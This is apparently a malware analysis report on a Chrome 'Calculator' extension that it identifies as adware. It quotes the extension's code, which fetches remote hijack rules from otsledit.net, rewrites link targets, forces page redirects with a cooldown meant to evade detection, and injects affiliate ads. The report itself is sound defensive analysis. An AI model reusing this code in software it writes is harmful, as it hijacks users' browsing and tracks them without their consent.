# Vulnerability Report: Calculator Extension

## Metadata
- **Extension Name**: Calculator
- **Extension ID**: lanchoggmnkmkehofmdonkbcdolfonmf
- **Approximate Users**: 50,000
- **Version**: 0.0.64
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-07

## Executive Summary

This extension presents itself as a simple calculator utility but contains **CRITICAL malicious functionality**. The extension implements sophisticated link hijacking, ad injection, and URL redirection mechanisms controlled remotely via the domain `otsledit.net`. The malicious code operates stealthily across all websites (`*://*/*`), modifying user navigation and injecting affiliate links without consent. This is **NOT** a legitimate calculator extension - it is adware/malware masquerading as productivity software.

**Overall Risk Level: CRITICAL**

## Vulnerability Details

### 1. Remote Configuration-Based Link Hijacking (CRITICAL)

**Severity**: CRITICAL
**Files**: `background.js` (lines 76-89), `content.js` (lines 609-657)
**Verdict**: CONFIRMED MALWARE

**Description**:
The extension fetches remote configuration from `https://otsledit.net/calc` containing patterns to match links on ANY website and redirect rules. This allows the attacker to:
- Dynamically control which links to hijack
- Inject affiliate tracking codes
- Redirect users to monetized links
- Update targets without releasing new versions

**Code Evidence** (background.js):
```javascript
fetch("https://otsledit.net/calc", {
  method: 'GET',
  headers: {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
  }
}).then(response => response.json()).then(data => {
  if (data.defaultMatches && data.defaultLinks && data.defaultSLink && data.defaultLinks.length && data.defaultSLink.length) {
    defaultMatches = data.defaultMatches;
    defaultLinks = data.defaultLinks;
    defaultSLink = data.defaultSLink;
    defaultMinor = data.defaultMinor;
  }
}).catch(error => console.log('Error query:', error));
```

**Code Evidence** (content.js link hijacking - lines 609-637):
```javascript
chrome.runtime.sendMessage({
  minor: true
}, response => {
  let ooncl = true;
  if (response && response['al'] && response['ll']) {
    let listLink = document.querySelectorAll(response['ll']);  // Selects links based on remote config
    let al = response['al'];
    for (let i in al) {
      for (let j in listLink) {
        if (al[i] && listLink[j].href && listLink[j].href.match(al[i][1]) && listLink[j].href.match(al[i][1])[0]) {
          let ncelik = function () {
            if (ooncl) {
              let href = listLink[j].href;
              listLink[j].href = al[i][2] + listLink[j].href;  // PREPENDS TRACKING URL
              chrome.runtime.sendMessage({
                updateCheck: al[i][0]
              }, response => {
                listLink[j].href = href;  // Restores after click
              });
              ooncl = false;
            }
            this.removeEventListener('click', ncelik);
          };
          listLink[j].addEventListener('click', ncelik);
        }
      }
    }
  }
});
```

**Impact**:
- Users' clicks are hijacked and monetized without consent
- Browsing activity tracked via affiliate links
- Privacy violation - all websites affected
- Remote kill switch capability

### 2. Automatic URL Redirection (CRITICAL)

**Severity**: CRITICAL
**Files**: `content.js` (lines 638-657)
**Verdict**: CONFIRMED MALWARE

**Description**:
Content script automatically redirects entire page navigation based on remote configuration, forcibly sending users through affiliate links with cooldown tracking to avoid suspicion.

**Code Evidence**:
```javascript
chrome.runtime.sendMessage({
  start: true
}, response => {
  if (response && response.defaultMatches) {
    let nn = new RegExp(response.defaultMatches, "i");
    let defaultLinks = response.defaultLinks;
    if (window.location.href.match(nn) && cT) {  // cT = checkTime check (3 day cooldown)
      let url = new URL(window.location.href);
      let domain = url.hostname;
      for (let i in defaultLinks) {
        if (domain.indexOf(defaultLinks[i][0]) != -1) {
          let t = Math.floor(Date.now() / 1e3);
          localStorage.setItem('ckAli', t);  // Track last redirect
          window.location.href = defaultLinks[i][1] + window.location.href;  // FORCED REDIRECT
          break;
        }
      }
    }
  }
});
```

**Time-based Rate Limiting** (lines 658-662):
```javascript
function checkTime(e) {
  let t = Math.floor(Date.now() / 1e3),
    a = parseInt(localStorage.getItem(e)) || 0;
  return !(t - a < 259200);  // 3 day (259200 seconds) cooldown to avoid detection
}
```

**Impact**:
- Entire page navigations hijacked
- Users forcibly sent through affiliate redirects
- Rate limiting makes behavior harder to detect
- Can target specific domains dynamically

### 3. Deceptive Permissions & Overly Broad Content Script Injection (HIGH)

**Severity**: HIGH
**Files**: `manifest.json` (lines 13-18)
**Verdict**: MALICIOUS DESIGN

**Description**:
The extension requests `*://*/*` content script access (all websites) despite presenting as a simple calculator. This is a massive overreach for stated functionality.

**Code Evidence**:
```json
"content_scripts": [
  {
    "matches": ["*://*/*"],
    "js": ["content.js"]
  }
],
"permissions": [
  "contextMenus",
  "activeTab",
  "scripting"
]
```

**Impact**:
- Extension runs malicious code on every website user visits
- No legitimate reason for calculator to access all websites
- Deceptive permission usage
- Privacy invasion at scale

### 4. Affiliate Ad Injection (HIGH)

**Severity**: HIGH
**Files**: `popup.js` (lines 383-391), `popup.html`
**Verdict**: CONFIRMED ADWARE

**Description**:
Extension injects affiliate advertising (wextap.com tracking links) into the calculator popup interface without proper disclosure.

**Code Evidence** (popup.js):
```javascript
if(!!localStorage['ads_close'] == false) {
    document.getElementById("ads").innerHTML = '<span class="close" id="close">☒</span> <a target="_blank" rel="nofollow" href="https://wextap.com/g/1e8d11449439e4a1019b16525dc3e8/"> <img height="42" border="0" src="/ads/AliExpress_Best_Sellers_hero-1488-552.jpg" alt="Aliexpress WW"/> </a>';

    document.getElementById("close").addEventListener("click", function () {
        document.getElementById('ads').style.display = 'none';
        localStorage['ads_close'] = true;
    });
}
```

**Impact**:
- Unwanted advertising in utility interface
- Affiliate tracking via wextap.com
- Undisclosed monetization

### 5. MD5 Hashing with Hardcoded API Keys (MEDIUM)

**Severity**: MEDIUM
**Files**: `content.js` (lines 548-606)
**Verdict**: SUSPICIOUS INFRASTRUCTURE

**Description**:
Content script includes a full MD5 implementation and hardcoded API keys/hashes with no apparent use in the visible code. This suggests hidden communication or authentication mechanisms.

**Code Evidence**:
```javascript
var cT = checkTime('ckAli');
const API_PUBLIC_KEY = "0DM2OgjXxj";
const MEMBER_HASH = "UUITtSMj";
const PANEL_HASH = "iY5qPRe9QQ";
const PRIVATE_KEY = "nnCBmSM2JzNIbhY7k3bHrJghZnxhub32";

/** start MD5 **/
var MD5 = function (d) {
  d = unescape(encodeURIComponent(d));
  let result = M(V(Y(X(d), 8 * d.length)));
  return result.toLowerCase();
};
// ... [MD5 implementation lines 560-606]
```

**Impact**:
- Suggests undisclosed backend communication
- Hardcoded credentials in client code (bad security practice)
- MD5 implementation indicates authentication/signing mechanism
- Purpose unclear but suspicious in context

### 6. Fallback Tab Creation Behavior (LOW)

**Severity**: LOW
**Files**: `background.js` (lines 23-26, 52-55)
**Verdict**: SUSPICIOUS BEHAVIOR

**Description**:
When calculator fails to inject into current tab, extension creates new tab navigating to `https://google.com`. Unclear necessity.

**Code Evidence**:
```javascript
chrome.tabs.sendMessage(tab[0].id, {
  name: "open_calculator"
}, response => {
  if (response) {} else {
    chrome.tabs.create({
      url: 'https://google.com'
    }, function () {});
    // ... inject CSS
  }
});
```

**Impact**:
- Unexpected tab creation behavior
- Minor annoyance, low severity in context of other issues

## False Positive Analysis

| Pattern | Location | Assessment |
|---------|----------|------------|
| `innerHTML` usage | Multiple locations | **NOT FP** - Used for ad injection and calculator UI. Calculator UI is legitimate, ad injection is malicious. |
| localStorage usage | content.js, popup.js | **NOT FP** - Used to track redirect timing and ad dismissal. Part of malicious rate-limiting mechanism. |
| querySelector/querySelectorAll | content.js | **NOT FP** - Used to select links for hijacking based on remote config. |

## API Endpoints & Data Flow

### External Network Calls

| Endpoint | Purpose | Data Sent | Data Received | Risk |
|----------|---------|-----------|---------------|------|
| `https://otsledit.net/calc` | Remote config fetch | None (GET) | JSON with link hijacking rules: `defaultMatches`, `defaultLinks`, `defaultSLink`, `defaultMinor` | CRITICAL - Remote control of malicious behavior |
| `https://wextap.com/g/1e8d11449439e4a1019b16525dc3e8/` | Affiliate tracking | Referrer, user click | Redirect to AliExpress | HIGH - Ad injection/tracking |

### Data Flow Summary

1. **On Extension Install/Update**:
   - background.js fetches configuration from `otsledit.net/calc`
   - Stores link hijacking rules in memory

2. **On Every Page Load** (`*://*/*`):
   - content.js requests configuration from background script
   - Scans page for links matching remote patterns
   - Attaches click event listeners to targeted links
   - Checks if page URL matches redirect patterns
   - If match + cooldown expired: Forcibly redirects entire page through affiliate link
   - Stores timestamp in localStorage to rate-limit redirects

3. **On Calculator Usage**:
   - Popup displays injected affiliate ad
   - Calculator functionality appears legitimate
   - Ad dismissal tracked via localStorage

4. **Data Exfiltration**:
   - No direct data exfiltration detected
   - However, browsing behavior tracked via affiliate links
   - All clicks on targeted links send referrer data to tracking domains

## Overall Risk Assessment

**CRITICAL RISK**

This extension is **sophisticated adware/malware** disguising itself as a productivity tool. Key risk factors:

1. **Remote-Controlled Malicious Behavior**: Configuration fetched from `otsledit.net` allows attacker to:
   - Target any domain for link hijacking
   - Update redirect rules without user knowledge
   - Deploy new attacks without releasing new versions
   - Implement kill switch capability

2. **Privacy Invasion at Scale**: Runs on ALL websites (`*://*/*`) to:
   - Monitor all browsing activity
   - Hijack link clicks
   - Force page redirects
   - Inject tracking codes

3. **Deceptive Practices**:
   - Presents as simple calculator utility
   - Hides affiliate link injection behind cooldown timers
   - No disclosure of monetization practices
   - Overly broad permission requests

4. **Monetization Without Consent**:
   - Affiliate link injection (wextap.com tracking)
   - Page redirect monetization
   - Ad injection in popup interface

## Recommendations

1. **IMMEDIATE REMOVAL RECOMMENDED** - This is malware, not a legitimate extension
2. **Report to Chrome Web Store** - Violates multiple store policies
3. **Users should uninstall immediately** - Extension monetizes browsing without consent
4. **Check browser for other extensions from same developer**
5. **Clear browser data** - localStorage may contain tracking timestamps

## Technical Indicators of Malice

- ✅ Remote configuration fetch from suspicious domain
- ✅ Link hijacking with affiliate injection
- ✅ Forced page redirects
- ✅ Overly broad permissions for stated functionality
- ✅ Rate limiting to evade detection
- ✅ Undisclosed monetization
- ✅ Hardcoded API keys for unknown purpose
- ✅ No legitimate reason for `*://*/*` content script access

## Verdict

**CRITICAL RISK - CONFIRMED MALWARE**

The Calculator extension (lanchoggmnkmkehofmdonkbcdolfonmf) is malicious adware that hijacks user browsing through remote-controlled link injection and page redirects. While the calculator functionality itself works, it serves only as a Trojan horse to justify the extension's installation. The actual purpose is to monetize user browsing activity through affiliate link injection and page redirects, all controlled remotely via `otsledit.net`.

**Recommendation: Immediate removal and reporting to Chrome Web Store.**
